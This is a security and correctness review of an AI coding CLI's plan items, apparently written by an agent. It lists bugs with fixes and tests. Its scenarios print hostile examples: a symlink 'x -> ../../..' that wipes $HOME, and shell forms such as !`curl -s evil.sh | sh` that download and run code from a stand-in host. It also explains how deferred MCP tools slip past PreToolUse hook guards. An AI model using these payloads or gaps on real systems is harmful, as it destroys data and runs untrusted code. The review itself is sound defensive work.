# plan-review-p1 — adversarial review of plan_comparison.md items VIS/CTX/INT/PLG/MCP/PRV/AUT (33 items)

HEAD `5e9195687` (master), 2026-10-26. Read-only review. Paths are relative to `/home/sites/sugarcraft/candy-code/` unless they start with `/` or a sibling lib name. CONFIRMED = traced in live source (and reproduced where stated); PLAUSIBLE = reasoned from source plus external behaviour, not proven end to end. No tracked file was modified; the scratch probes are under `/tmp/claude-1000/-home-sites-sugarcraft/10a6cc1f-690d-425f-9160-c07945c954f0/scratchpad/plan-review-p1/` (`ctx3-probe.php`; the PLG-1-P1 `rmprobe/` run was in the same dir).

## Summary

- **Verdicts (33):** SHIPPED-OK 13 · SHIPPED-WITH-PROBLEMS 20 · PARTIAL 0 · NOT-SHIPPED 0 · DEFERRED-BY-DESIGN 0. Every item has commits and a production wiring path from `bin/candy-code` / `Bootstrap` / `Chat` / `serve`. PRV-4 tier 3 (MCP-OAuth extraction) is deferred by design inside a shipped item. MCP-6 shipped as part of VIS-3.
- **Problems (51):** 1 CRITICAL · 11 MAJOR · 24 MINOR · 15 NIT.
- **CRITICAL:** PLG-1-P1 — when `bundles install <git-url>` fails, its cleanup follows symlinks inside the clone. A repo containing `x -> ../../..` empties `$HOME` (reproduced in scratch).
- **MAJOR (one line each):**
  - CTX-3-P1: instruction diffs never reach the model on the forked TUI/serve turn path (reproduced).
  - INT-2-P1: Cursor "Auto Attached" rules (`globs` + `alwaysApply:false`) are imported as disabled.
  - INT-4-P1: the generated `cc:{event}:{index}` names collide between the user and project `.claude/settings.json`, and the collision refuses the launch.
  - PLG-1-P2: `!cmd` shell forms in bundle commands run at user-tier trust.
  - MCP-2-P1: `!cmd` in an MCP prompt body runs under `trustedProjectCommands`, which lets a remote server reach the local shell.
  - MCP-3-P1: user-scope stdio servers spawn with cwd = the (possibly untrusted) checkout, so the checkout can supply what they run (PLAUSIBLE).
  - MCP-7-P1: PreToolUse hooks matching `mcp__*` silently stop firing once a server is deferred to `mcp_call`; the fix was documentation only.
  - PRV-2-P1: `/effort` is still set-but-ignored on non-reasoning OpenAI models and on providers that cannot shape effort.
  - PRV-4-P1: `candy-code login <provider>` replaces the whole provider block.
  - AUT-1-P1: persisted schedules carry no project root, so a row fires in whichever host's project wins the lock.
  - AUT-6-P1: a webhook body over 64 KiB arrives empty and still starts a billed turn.
- **Theme:** three independent third-party-text → shell paths (MCP-2-P1, PLG-1-P2, and through INT-3's tiering) share one root cause. `TurnController::refuseCommandShell()` (`src/Host/TurnController.php:521-575`) gates only the `project` and `mcp` tiers, and only behind `trustedProjectCommands`; once that gate passes, an `Ask` verdict proceeds without prompting. One provenance-aware fix should cover all of them.
- **Annotation re-checks:** all 2026-10-26 annotations on these items hold or are resolved at HEAD. One residue remains: COMPARISON.md:788 still describes MCP-6's never-shipped "restarts from launch-time entry bytes".

## Item verdicts

| item | verdict | commits | wiring path | #problems |
|---|---|---|---|---|
| VIS-1 | SHIPPED-WITH-PROBLEMS | 8fbf46f7d, 9ab97cfd5, bdc8a85fb | `Renderer::view` → `renderHistory()` empty branch `src/Renderer.php:4214-4224` → `StartupSummary::render()` `src/Support/StartupSummary.php:80-90` | 2 (MINOR, NIT) |
| VIS-2 | SHIPPED-OK | 6e012ddc0 (2a), 855b64271 (2b) | 2a `ContextHostCommand::run` `src/Host/Commands/ContextHostCommand.php:29-45` → `ContextCommand::instructionLines` `src/Commands/ContextCommand.php:155-187`; 2b `Chat` memory-open arm `src/Chat.php:15609-15661` → `EditorCommand::openFile` (`Cmd::exec`) `src/Commands/EditorCommand.php:118-127` | 1 (NIT) |
| VIS-3 | SHIPPED-OK | cc794226a, 1734f4c97, babc3be55 | `/hooks` → `HooksHostCommand::run` `src/Host/Commands/HooksHostCommand.php:27-42`; `/mcp reconnect` → `McpAuthCommand` 5th arm `src/Commands/McpAuthCommand.php:172` → drift gate :213-220 → `reconnectPair()` :275-295 | 2 (NIT, NIT) |
| VIS-4 | SHIPPED-OK | 8c9b8435d, 6b684f7bf, 8f47aa89a, fc0afae58, 1e148e8f3 | Ctrl+P → `runRootPaletteAction` `src/Chat.php:17152-17203` → `dispatchPaletteCommand` :17225-17252 | 1 (NIT) |
| VIS-5 | SHIPPED-OK | 6ae94a751 | `submit()` → `skillInvocationDraft()` `src/Chat.php:9578-9590, 11321-11380` → `$name` mention channel | 0 |
| VIS-6 | SHIPPED-OK | d83f98d50, 6c4ff4171 | `EngineBackend::primeMemoryRecallForTurn` `src/Backend/EngineBackend.php:4837-4874` → `Runtime::announceMemoryRecall` `src/Runtime.php:5975-5995` → `RuntimeNoticeSink` → `Chat::pumpRuntimeNotices` (uiOnly) | 1 (NIT) |
| CTX-1 | SHIPPED-WITH-PROBLEMS | 8f8bc31b7, 98f63a0b2, f6074f88b, bcabe6476, 8c337b676, a2f1de488 | `ProviderFactory` anthropic arm `src/Providers/ProviderFactory.php:1136-1138` → `anthropicBody()` `src/Providers/Concerns/AnthropicMessagesWire.php:475-533` + replay-first `anthropicBlocks()` :784-797 | 2 (MINOR, MINOR) |
| CTX-2 | SHIPPED-WITH-PROBLEMS | 0aeb3b6d0, ca11f2127, a2f1de488 | `FileMentions` `%PDF-` sniff `src/Attachments/FileMentions.php:296-311` → `EngineBackend::typedUserMessage` gate :5984-5996 → `AttachmentEncoding::anthropicBlocks` `src/Providers/AttachmentEncoding.php:87-95` | 1 (MINOR) |
| CTX-3 | SHIPPED-WITH-PROBLEMS | a4103edb3, dc914968d | `EngineBackend::runTurn` :1838-1839 → `Runtime::turnContext` `src/Runtime.php:5709-5717` → `instructionDiff()` :5742-5754 | 1 (MAJOR) |
| CTX-4 | SHIPPED-OK | 79af6a505, 712ee1174 | `CompactionService` `auditCompactionReply` `src/Host/CompactionService.php:1484-1504` → `SummarySafeguard::assess`; TUI `src/Chat.php:14302-14305, 14417-14432`; served `src/Host/SessionHost.php:616-619, 1077-1080, 1407-1412` | 0 |
| CTX-5 | SHIPPED-WITH-PROBLEMS | e53dc6779, 4a438c5d9, 261708b1f, 428a1a9a4, 89a39a035 | TUI `App::subscriptions` tick `src/App/App.php:4681-4697` → `Chat::handleIdleCompactTick` `src/Chat.php:14151-14200`; serve `SessionHost::armIdleAutoCompaction` `src/Host/SessionHost.php:562, 641-720` | 2 (MINOR, NIT) |
| INT-1 | SHIPPED-OK | eacfa378e, 989696a5a, c0453cf46, 733f39180, 4afffcd4a, 2c23e28cb | `Bootstrap::instructionLoader()` `src/Cli/Bootstrap.php:8904` → `InstructionFileLoader` FILENAMES :180, `loadPersonal()` :548-569, `excluded()` :615 (user-only key, absent from `LayeredSettings::PROJECT_TIER_KEYS` :854) | 1 (NIT) |
| INT-2 | SHIPPED-WITH-PROBLEMS | 883ed7cad, 6c3b5e260, e85e5c4db | `Runtime` → `RuleLoader` foreign tiers `src/Context/RuleLoader.php:525-660` → `Rule::fromFile` `src/Context/Rule.php:233-238, 277-283` | 2 (MAJOR, MINOR) |
| INT-3 | SHIPPED-OK | c186bd711 | `CommandLoader::loadAll()` strict-bottom merge `src/Commands/CommandLoader.php:605-626` → `ForeignCommandDiscovery::discover()`; Renderer badge `src/Renderer.php:6024` | 0 (bundle-tier shell issue filed as PLG-1-P2) |
| INT-4 | SHIPPED-WITH-PROBLEMS | 8ae9dba02, 66bc3812a | `Bootstrap::hookFiles()` `src/Cli/Bootstrap.php:6239-6300` → `hookFileEntries()` :6022 → `ClaudeSettingsHooks::fromFile` → `HookManager`; ProtectFiles POLICY_ASK `src/Hooks/BuiltIn/ProtectFilesHook.php:314` | 3 (MAJOR, MINOR, MINOR) |
| PLG-1 | SHIPPED-WITH-PROBLEMS | a4b9d76bc, ab6c4838e, 36a8a9e95, 1a7816735, 406b9f933, e712080dd, 8d3491ba7, f2b50fcff, 8088104b1 | `Bootstrap::bundles()` `src/Cli/Bootstrap.php:2273` → CommandLoader / ForeignAgentPresetRegistry / SkillManager; CLI `Subcommands::bundlesList/bundlesInstall` `src/Cli/Subcommands.php:1464-1720`; roster `ParsedArgs::SUBCOMMANDS` `src/Cli/ParsedArgs.php:56` | 5 (CRITICAL, MAJOR, MINOR, MINOR, NIT) |
| MCP-1 | SHIPPED-WITH-PROBLEMS | 87c697922 (wire), e07518c56 (surface) | TUI submit → `Chat::userTurnMessage` `src/Chat.php:9925-9936` → `TurnController::userTurnMessage` `src/Host/TurnController.php:1032-1076` → `ContextMentions::mcp()` `src/Attachments/ContextMentions.php:396-464` → `McpClient::readResource()` `src/MCP/McpClient.php:972-994` | 1 (MINOR) |
| MCP-2 | SHIPPED-WITH-PROBLEMS | e53670292 (wire), e07518c56 (surface) | Chat ctor merges `McpPromptCommands::specs()` `src/Chat.php:1796` → materialize at submit :11101-11102 → `McpClient::prompt()` → template expansion through `TurnController::refuseCommandShell` :521-575 | 1 (MAJOR) |
| MCP-3 | SHIPPED-WITH-PROBLEMS | 6671d3606, 66d4f0d41, 421527a15 | `McpDecision::mcpConfigDecision` user tier `src/Cli/McpDecision.php:129-136` → `McpClient::loadConfig()` `src/MCP/McpClient.php:1185-1220` → `startServers()` project-first shadow walk :231-307 | 1 (MAJOR, PLAUSIBLE) |
| MCP-4 | SHIPPED-OK | 9bb75d21b, 6b8e7e5cd, 83f5f321d, 16b12882c, 4ffb5a08b | `McpClient::buildServer` `'sse'` arm `src/MCP/McpClient.php:760-775` → `SseMcpServer` (origin lock :479-522, no-redirect :1034-1040 / :1322-1351, bounded reconnect :703-730, pid-owned stream :630-635) | 1 (NIT) |
| MCP-5 | SHIPPED-OK | c0a77a24f, da1089b3b, ad5ba3fac, 4ba2caf2b, 6a69bc77f | `/mcp login <server>` Chat intercept → `McpLoginFork::arm()` `src/Support/McpLoginFork.php:65-97` (`ProcessContainment::spawnSpec`) → 1 s `pollCmd` → `McpLoginProgressMsg` | 1 (NIT) |
| MCP-6 | SHIPPED-OK (as VIS-3) | cc794226a, 1734f4c97 | `/mcp reconnect` = VIS-3's arm; per-server `reconnectServer` never existed (rcp2 accurate) | 0 (doc residue filed as VIS-3-P1) |
| MCP-7 | SHIPPED-WITH-PROBLEMS | 52a830ff9, fe649a6b7, 6c1607877, c5bb7eacc, e1209711f, 47e8a1414 | Bootstrap tool build → `McpToolShape` (memoised) → `ToolCatalog` 39/40 (`McpListTool`, `McpCallTool`) → `McpClient::callTool()`; gate parity `src/Permissions/PermissionGate.php:889-897, 1526-1560`; rule parity `src/Permissions/PermissionRule.php:520-538` | 3 (MAJOR, MINOR, MINOR) |
| PRV-1 | SHIPPED-WITH-PROBLEMS | 457911215, 38bb9eec4, 0f34fd404, cc4098a63, d960b2327 | palette/`/model` → `primeModelCatalog()` `src/Chat.php:17066, 12207` → `ModelCatalog::prefetch()` → `OpenAiModelsEndpoint::fetch()`; CLI `models all` `src/Cli/Subcommands.php:668` | 2 (MINOR, NIT) |
| PRV-2 | SHIPPED-WITH-PROBLEMS | 8fcb22df4, 4d13daa95, c2095c2d7, b84565ab7, 63249863a | `/effort` → `Chat::handleEffortCommand()` `src/Chat.php:12234` → `EngineBackend::withReasoningEffort`; launch `Bootstrap::resolvedReasoningEffort()` `src/Cli/Bootstrap.php:3702` | 2 (MAJOR, MINOR) |
| PRV-3 | SHIPPED-WITH-PROBLEMS | c08cf5674, bd9ae3bb4, 4e0e38720 | `ProviderFactory::createGemini()` `src/Providers/ProviderFactory.php:1701` → `GeminiProvider` (x-goog-api-key header :150) over `Concerns/GeminiGenerateContentWire` | 1 (MINOR) |
| PRV-4 | SHIPPED-WITH-PROBLEMS | 6da35aefb, 8477273f0, b1873552e, 7714d65f3, 5b6186bed (tier 3 deferred by design) | `ProviderFactory::createCodex()` :1166 → `CodexInvocation::execute()` `src/Providers/CodexInvocation.php:129-138`; CLI `Subcommands::login()` `src/Cli/Subcommands.php:845-975` | 4 (MAJOR, MINOR, MINOR, NIT) |
| AUT-1 | SHIPPED-WITH-PROBLEMS | 216824e1b, 2e5007b76, e89786acd, afb3c0644, 0a0f31a79, ba13c7f77, 400271177, 243010297, 652ddff48 | workspace service `ScheduleRegistry::loadDefault()` `src/Cli/Bootstrap.php:1910` → TUI `Chat::subscriptions()` `src/Chat.php:18118-18128` → `pumpSchedules` :18518-18570; serve `Dispatcher::start` `src/Protocol/Dispatcher.php:175` → `BackgroundEvents::pumpSchedules` `src/Host/BackgroundEvents.php:221-238` → `ScheduleSpawner::closure` → `BackgroundSupervisor::spawnSession` | 4 (MAJOR, MINOR, MINOR, NIT) |
| AUT-2 | SHIPPED-WITH-PROBLEMS | a8d9dfac3, 90d3de218 | `NonInteractive::run` `$ownsSession` funnel `src/Cli/NonInteractive.php:311-349` → history seed :464-466 → envelope :601-612 → persist :653-664 | 1 (MINOR) |
| AUT-3 | SHIPPED-OK | 24899ee06 | `NonInteractive::run` → `StreamJsonEmitter` `src/Cli/NonInteractive.php:567-582` → terminal line :637-641 | 0 |
| AUT-4 | SHIPPED-WITH-PROBLEMS | 9ffafcdea (+4e0e38720 Gemini) | `ArgvParser` `--json-schema` `src/Cli/ArgvParser.php:640-689` → honesty gate `src/Cli/NonInteractive.php:420-430` → `EngineBackend::withJsonSchema` → `Runtime::jsonSchemaFor()` `src/Runtime.php:845-872` | 2 (MINOR, MINOR) + cross-ref PRV-3-P1 |
| AUT-5 | SHIPPED-OK | b1c8382b7 | `bin/candy-code:439` `Bootstrap::useMaxTurns` → `LaunchContext::withResolvedMaxToolSteps` (TUI + `-p`) | 0 |
| AUT-6 | SHIPPED-WITH-PROBLEMS | a73d46e9a, 6eacea541 | `Serve` mounts `HookWebhooks` only when configured `src/Cli/Serve.php:415-455` → `ApiController` prefix branch `src/Server/Http/ApiController.php:62-68` → `HookWebhooks::handle()` → `spawnSession` | 3 (MAJOR, MINOR, NIT) |

## Problems

### PLG-1-P1 [CRITICAL] [CONFIRMED] `bundles install` failure cleanup follows directory symlinks and deletes whatever a cloned repo points at
- **Where:** `src/Cli/Subcommands.php:1920-1935`. `removeTree` does `\is_dir($child) ? self::removeTree($child) : @\unlink($child)`, and `is_dir()` follows symlinks. It is reached from the git-URL arm when the clone fails (:1670), when there is no manifest (:1683), when the manifest name is invalid (:1694), when the name already exists (:1702), and from the copy fallback (:1712-1717). The scratch dir is `~/.candy-code/bundles/.install-<uniqid>` (:1664), so `../../..` resolves to `$HOME`.
- **Scenario:** a repo carries the symlink `x -> ../../..` plus no manifest, an invalid `name`, or a `name` that is already installed. The last case means a plain re-install is enough. `candy-code bundles install https://…/repo.git` clones it (git materialises the symlink), refuses the install, and `removeTree($scratch)` recurses through `x`, unlinking every file the user can delete under `$HOME`. Reproduced in scratch: a dir holding `evil -> ../victim` emptied `victim/`.
- **Fix:**
  - Never descend into links: `if (is_link($child)) { @unlink($child); continue; }` before the `is_dir` test.
  - Clone with `-c core.symlinks=false`. The loaders already refuse escaping links, so nothing legitimate is lost.
  - Add the same `is_link` guard to `copyBundleTree` (PLG-1-P3).
- **Files:** `src/Cli/Subcommands.php` (`removeTree`, `bundlesCloneDefault` argv, `copyBundleTree`).
- **Tests:** `tests/Bundles/BundleInstallTest.php`. A spawn seam materialises a scratch with `link -> <outside sentinel>`, crossed with no manifest, an invalid name and an existing name; assert the sentinel survives and the scratch is gone. Add an argv pin for `core.symlinks=false`.

### CTX-3-P1 [MAJOR] [CONFIRMED — reproduced] Instruction diffs never reach the model on the forked turn path (TUI + serve)
- **Where:**
  - `src/Runtime.php:5742-5754` memoises `InstructionDiffTracker::capture($loader)` on the first `turnContext()`. That only runs inside `runTurn`, which is the forked child on the interactive path.
  - The parent's pre-fork `EngineBackend::beginSessionTurn()` (`src/Backend/EngineBackend.php:2843-2860`) primes only `primeSessionPrompt()` → `systemPromptSections()` (`src/Runtime.php:5783-5786`).
  - `capture()` reads the baseline from current disk (`src/Context/InstructionDiffTracker.php:177-190`). So each child captures "frozen = current disk", `recheck()` finds nothing, and the child's memo dies with it.
- **Repro:** `ctx3-probe.php` in scratch, with CLAUDE.md edited between turns. Sync `complete()` gives `turn2: DIFF-PRESENT+gamma`; forked `completeAsync()` gives `turn2: DIFF-ABSENT-gamma`.
- **Scenario:** the user adds "never touch src/legacy" to CLAUDE.md mid-session. The frozen slab keeps the old text and no diff is sent, so the model violates the new rule. COMPARISON.md:798 advertises the feature as shipped.
- **Fix:** add a public `Runtime::primeInstructionDiff(App)` and call it in `beginSessionTurn()` right after `primeSessionPrompt()`. This also closes the tracker docblock's declared freeze/capture window (:67-71).
- **Files:** `src/Backend/EngineBackend.php`, `src/Runtime.php`, `src/Context/InstructionDiffTracker.php` (docblock).
- **Tests:** a fork-path twin of `testAMidSessionInstructionEditRidesTheTailRowAndNotTheFrozenPrefix` in `tests/Providers/PromptPrefixByteStabilityTest.php` that drives `completeAsync()` twice (skip without pcntl). The existing pins only use `complete()` (:149-204).

### INT-2-P1 [MAJOR] [CONFIRMED] Cursor "Auto Attached" rules (the canonical `.mdc` shape) never fire
- **Where:** `src/Context/Rule.php:233-238` (`enabled = enabled ?? true && alwaysApply ?? true`) with :277-283 (`globs:` → path trigger). Disabled rules are dropped in `RuleLoader::load()` (`src/Context/RuleLoader.php:377`). The only pin is `tests/Context/RuleLoaderTest.php:884-913`, which covers `alwaysApply` without globs.
- **Scenario:** Cursor writes every non-always rule as `globs: src/**/*.ts` + `alwaysApply: false`. Imported, it parses as disabled, so the `globs`→`paths` alias is dead for every real Cursor glob rule.
- **Why the plan's rationale doesn't hold:** it says a mis-map would "stand in every prompt". That is false for path-scoped rules, which are already deferred to tool time (`src/Runtime.php:4583-4597, 4664`). Separately, a comma-string `globs: a/*.ts, b/*.ts` becomes one never-matching pattern (`src/Context/Rule.php:442-444`).
- **Fix:**
  - `alwaysApply:false` disables a rule only when it has no `paths`/`globs`.
  - Split comma-string globs into separate patterns.
  - Document the Cursor mapping table in `docs/MEMORY.md`.
- **Files:** `src/Context/Rule.php`, `docs/MEMORY.md`.
- **Tests:** in `RuleLoaderTest`:
  - `globs + alwaysApply:false` → enabled + path-scoped + absent from the standing splice;
  - a comma-string glob → two patterns;
  - the no-globs pin stays.

### INT-4-P1 [MAJOR] [CONFIRMED] Generated `cc:{event}:{index}` names collide across files and refuse the launch
- **Where:** `src/Hooks/ClaudeSettingsHooks.php` (name `cc:{$event}:{$index}`, with the index counted per file) and `src/Hooks/HookManager.php:~156-160` (a duplicate name throws). The behaviour is pinned as intended by `tests/Cli/BootstrapHookFileTest.php:866-878` (`testTwoClaudeSettingsFilesNamingTheSameGeneratedEntryRefuseTheStart`).
- **Scenario:** the most common Claude Code layout is a global `PreToolUse` hook in `~/.claude/settings.json` plus a repo `PreToolUse` hook in `.claude/settings.json`. Once the repo is added to `trustedProjectHooks`, candy-code refuses to start. Claude Code entries have no `name`, so the user cannot fix it. A `settings.json` + `settings.local.json` pair fails the same way.
- **Fix:** file-qualified names, `cc:{user|project|local}:{event}:{index}`. Note the one-time policy-freshness churn.
- **Files:** `src/Hooks/ClaudeSettingsHooks.php`, `src/Cli/Bootstrap.php` (`hookFileEntries`), `docs/HOOKS.md:59-61`.
- **Tests:** flip `BootstrapHookFileTest:866` so both rows register. Add the settings + local pair and a name-format pin.

### PLG-1-P2 [MAJOR] [CONFIRMED] Commands from a git-cloned user bundle run their `` !`cmd` `` shell forms with no trust gate and no prompt
- **Where:** `src/Commands/ForeignCommandDiscovery.php:146-152` stamps rows with `$bundle->tier`, which is `user` for `~/.candy-code/bundles` (`src/Bundles/BundleDiscovery.php:20, 68-70`). `src/Host/TurnController.php:521-575` gates only the `project` and `mcp` tiers. For everything else "ONLY `Deny` REFUSES; an `Ask` proceeds" (:511).
- **Scenario:** after `bundles install https://github.com/x/cool-plugin`, typing `/cool-review` expands `` !`curl -s evil.sh | sh` `` unprompted in default mode. `docs/PLUGINS.md` declines bundle hooks because they "execute arbitrary programs … smuggled in by a third-party folder", yet command shell forms from the same folder run.
- **Fix:** give bundle rows their own provenance (a `bundle` tier, or a gate on `$spec->source === SkillSource::Bundle`). Refuse shell forms from bundles in the MVP, or require a user-tier per-bundle allowlist. Document it as a third declined surface. Share the fix with MCP-2-P1.
- **Files:** `src/Host/TurnController.php`, `src/Commands/ForeignCommandDiscovery.php` (or the `CommandSpec` tier), `docs/PLUGINS.md`, `lang/en.php`, `docs/COMMANDS.md`.
- **Tests:** `tests/Host/TurnControllerBundleShellTest.php` (a bundle command with a `!` form is refused and the gate is never evaluated), plus a bundle integration pin.

### MCP-2-P1 [MAJOR] [CONFIRMED] An MCP prompt body's `` !`cmd` `` runs a local shell whenever the project is in `trustedProjectCommands` — a remote server gains local exec under an unrelated trust grant
- **Where:**
  - `src/Commands/McpPromptCommands.php:40-44` (TRUST: fetched bodies "pass the same gate a cloned repository's command files do");
  - `src/Host/TurnController.php:545-554` (the mcp-tier leg refuses only when `!$projectCommandsTrusted`);
  - :567-575 (after that, only `Deny` refuses; `Ask` proceeds);
  - pinned by `tests/Host/TurnControllerTest.php:186` (`'the same key that trusts project files trusts fetched bodies'`).
- **Scenario:**
  1. The operator lists their repo in `trustedProjectCommands` (needed for their own `.candy-code/commands` shell forms).
  2. They configure a remote http/sse MCP server, e.g. a SaaS docs server in `~/.candy-code/mcp.json` (MCP-3).
  3. The server, compromised or malicious, returns a `prompts/get` body containing `` !`curl x|sh` ``.
  4. The user types `/mcp__docs__summarize`, and in default mode the command runs with no prompt.

  Trusting your own repo's command files says nothing about a remote server's text. Claude Code never executes shell from MCP prompts. The plan text ("body `!cmd` rides the existing fork path") asked for this, so the spec itself is the defect.
- **Fix:** treat mcp-tier bodies' `!` forms as inert text (or refuse them with a notice) regardless of `trustedProjectCommands`. If shell forms are ever wanted, add a per-server user-tier opt-in (`mcpPromptShell: ["server"]`) that is never project-settable.
- **Files:** `src/Host/TurnController.php`, `src/Commands/McpPromptCommands.php` (docblock), `docs/MCP.md` (prompts section), `lang/en.php`.
- **Tests:** flip `TurnControllerTest:186` to assert a refusal even with trust = true. Add a `McpPromptCommandsTest` end-to-end case: a fetched body with `` !`echo pwned` `` never reaches the fork, and the refusal text is in the sent prompt.

### MCP-3-P1 [MAJOR] [PLAUSIBLE] User-scope stdio servers start in every checkout with cwd = the checkout, so an untrusted repo can supply what they execute
- **Where:**
  - user entries are admitted on ownership alone, with no repo trust (`src/Cli/McpDecision.php:129-136`; `docs/MCP.md:104-111`);
  - the stdio spawn passes `cwd = null` to `proc_open`, inheriting candy-code's cwd, which is the project root (`sugar-mcp-client/src/StdioMcpServer.php:373-383`, arg 4 `null`; `src/MCP/StdioMcpServer.php:160` hands only argv + env);
  - `docs/MCP.md` never states the cwd.
- **Scenario:** the user's `~/.candy-code/mcp.json` has `{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem"]}` or `{"command":"python","args":["-m","my_mcp"]}`. They open candy-code in a freshly cloned, untrusted repo that ships `node_modules/@modelcontextprotocol/server-filesystem/` (npm exec prefers a locally installed package) or `my_mcp.py` (`python -m` puts cwd on `sys.path`). The repo's code then runs at launch with the user's MCP env, and no trust prompt appears — the exact proc_open-through-a-clone the project tier's trust gate exists to stop.
  - The candy-code half (cwd inherited, no repo trust) is CONFIRMED. Exploitability depends on the user's command shape, hence PLAUSIBLE.
- **Fix:** spawn user-tier stdio servers with `cwd = $HOME` (or the `~/.candy-code` dir) unless the entry names an explicit `cwd`. Keep the project tier's cwd at the project root. Document the cwd per tier in `docs/MCP.md` "Two tiers".
- **Files:**
  - `src/MCP/McpClient.php` (`startServer`/`buildServer`, passing the tier);
  - `src/MCP/StdioMcpServer.php` + the `sugar-mcp-client/src/StdioMcpServer.php` spawn (a cwd parameter);
  - `docs/MCP.md`.
- **Tests:** a `tests/MCP` stub server echoing `getcwd()`: a user-tier entry reports `$HOME` while a project-tier entry reports the root, and an explicit `cwd` wins.

### MCP-7-P1 [MAJOR] [CONFIRMED] Deferral (default ON at 8000 schema tokens) silently takes deferred servers out of every `mcp__*` PreToolUse hook matcher — fixed only in docs
- **Where:**
  - `docs/MCP.md:684-692`: hooks "must additionally match `mcp_call` to keep seeing the deferred ones";
  - `src/Tools/BuiltIn/McpCallTool.php:29-32` (same disclosure);
  - review commit e1209711f converted reviewer F-MAJOR-1 into a docs edit;
  - `grep mcp_call src/Hooks src/Runtime.php` shows no hook-side translation (only the write roster `src/Runtime.php:704`);
  - the spec required that "dispatcher calls route through the SAME … PreToolUse chain" and that a Deny bind both spellings.
- **Scenario:** an operator, or a Claude Code import via INT-4 (`.claude/settings.json` hooks with `"matcher": "mcp__prod_db__.*"` are common), guards destructive MCP tools with a PreToolUse deny hook. They add a large server, or `prod_db` itself grows past `mcp.lazySchemaTokens`. Its tools now ride `mcp_call`, the hook matcher no longer matches, and `drop_table` runs with only the permission gate in the way. Nothing at launch says a hook lost coverage.
- **Fix:** before PreToolUse matcher evaluation, present a dispatched `mcp_call` to hooks under its wire name. Either `tool_name = mcp__server__tool` and `tool_input = arguments` (keeping the original in an extra field), or evaluate matchers against both spellings, mirroring `PermissionRule`'s parity leg. Alternatively, launch-notice every hook matcher that matches a deferred tool's wire name but not `mcp_call`.
- **Files:** the PreToolUse dispatch site (`src/Hooks/HookManager.php` matcher evaluation or the `Runtime::gate()` hook call), `docs/MCP.md:684-692`, `docs/HOOKS.md`, `src/Tools/BuiltIn/McpCallTool.php` docblock.
- **Tests:** `tests/MCP/McpDispatcherToolsTest.php` (or a new `tests/Hooks/McpCallHookParityTest.php`): a `mcp__srv__.*` deny hook blocks `mcp_call(srv, tool)`, and a CC-imported matcher does the same.

### PRV-2-P1 [MAJOR] [CONFIRMED] `/effort` is still set-but-ignored on whole provider/model slices (the banned failure mode)
- **Where:**
  - the `/effort` gate is per provider (`instanceof ShapesReasoningEffort`), not per model (`src/Chat.php:12234-12310`);
  - `src/Providers/OpenAIProvider.php:477-494` emits `reasoning_effort` only inside `isReasoningFamily()`;
  - the reply claims "The tier rides the reasoning-effort field of every request" (`lang/en.php:1872`);
  - the launch reader applies a persisted tier to every provider silently (`src/Cli/Bootstrap.php:3702-3711`).
- **Scenario:** on `openai` + `gpt-4.1`/`gpt-4o`/`gpt-5-chat-latest`, `/effort high` reports success but nothing is sent. A tier persisted on anthropic is silently applied after switching to bedrock/custom.
- **Fix:** add a model-aware `ShapesReasoningEffort::shapesEffortFor(string $model)`. Refuse at `/effort`, and launch-notice when a configured tier lands on a non-shaper. Consider per-provider persistence.
- **Files:** `src/Providers/ShapesReasoningEffort.php` + implementers, `src/Chat.php`, `src/Cli/Bootstrap.php`/`LaunchContext`, `lang/en.php`, `docs/SETTINGS.md`.
- **Tests:** an effort-command test refusing on `openai`+`gpt-4o`; a launch-notice test with a persisted tier on bedrock; a per-provider predicate roster pin.

### PRV-4-P1 [MAJOR] [CONFIRMED] `candy-code login <openai|anthropic|gemini>` wipes the rest of that provider's config block
- **Where:** `src/Cli/Subcommands.php:973` (`$providers[$type] = ['type' => $type, 'apiKey' => $key];`). The docblock (:930-935) and `tests/Cli/LoginSubcommandTest.php:165` guard other providers only.
- **Scenario:** rotating a key deletes the block's `model`, `thinkingBudget`, `baseUrl` (a corporate gateway, so the next request goes straight to the public API) and `modelPrices`.
- **Fix:** merge into the existing block and refuse on a type mismatch.
- **Files:** `src/Cli/Subcommands.php`.
- **Tests:** `LoginSubcommandTest`: `model`/`baseUrl`/`thinkingBudget` survive; a mismatched type refuses.

### AUT-1-P1 [MAJOR] [CONFIRMED] Persisted schedules carry no project root — a row fires in whichever host's project wins the lock
- **Where:**
  - the row is `name/every/prompt/provider/permissionMode/nextDue/enabled` (`src/Background/Schedule.php:184-195`);
  - `ScheduleSpawner::closure` spawns with `workingDirectory: $root`, the host's root (`src/Background/ScheduleSpawner.php:44-61`);
  - hosts pass their own root: `src/Chat.php:18528-18531` (`$this->projectRoot`), `src/Host/BackgroundEvents.php:227-229` (`$this->root`);
  - one home-global file (`src/Background/ScheduleRegistry.php:137-139`) is evaluated by every TUI and serve on that home, and the first lock wins (`fireDue` :391ff, `claimLock` :619).
- **Scenario:** the operator writes a row "every 3600: run the tests and fix failures" (`accept-edits`) meaning repo A. Opening a TUI in repo B (or `$HOME`, or a serve rooted elsewhere) lets that host's 2 s pump claim the row, so the daemon edits repo B. With two hosts up, which repo runs is a race. Neither the in-product help (`lang/en.php:2001-2002`) nor any doc says where a row runs, and no docs page describes `schedules.json` at all (only the `docs/COMMANDS.md:391-392` roster lines).
- **Fix:**
  - Add a realpath'd `root` field, required for persisted rows. `/loop` keeps the session root.
  - Make `fireDue` skip rows whose root ≠ the host root, or spawn in the row's root only behind the same trust checks a launch there would apply.
  - Make a rootless row a load note ("not bound to a project — will not fire").
  - Document the file format.
- **Files:** `src/Background/Schedule.php`, `src/Background/ScheduleRegistry.php`, `src/Background/ScheduleSpawner.php`, `src/Chat.php` (pump), `src/Host/BackgroundEvents.php`, `lang/en.php`, `README.md` or `docs/COMMANDS.md`.
- **Tests:**
  - `tests/Sessions/ScheduleRegistryTest.php`: a rootless row is a load note and never fires;
  - `tests/Host/BackgroundEventsSchedulesTest.php`: a row bound to /a is skipped by a host at /b and fired by a host at /a;
  - extend `tests/Sessions/ScheduleCrossHostFireTest.php`.

### AUT-6-P1 [MAJOR] [CONFIRMED] Webhook bodies over 64 KiB arrive EMPTY and still start a billed background turn
- **Where:**
  - `src/Server/Server.php:241` wires `RequestBodyBufferMiddleware(ServerConfig::MAX_API_BODY_BYTES)` (65,536 B, `src/Server/ServerConfig.php:60`).
  - React's middleware does not refuse an over-limit body. It swaps in `BufferedBody('')` and calls `$next` (`vendor/react/http/src/Middleware/RequestBodyBufferMiddleware.php:40-41` for a known size, :49-50 + :66-71 for a streamed/chunked body that overflows).
  - `src/Server/Http/HookWebhooks.php:130-133` then splices `PromptFence::escape('')`, and :136 spawns the turn.
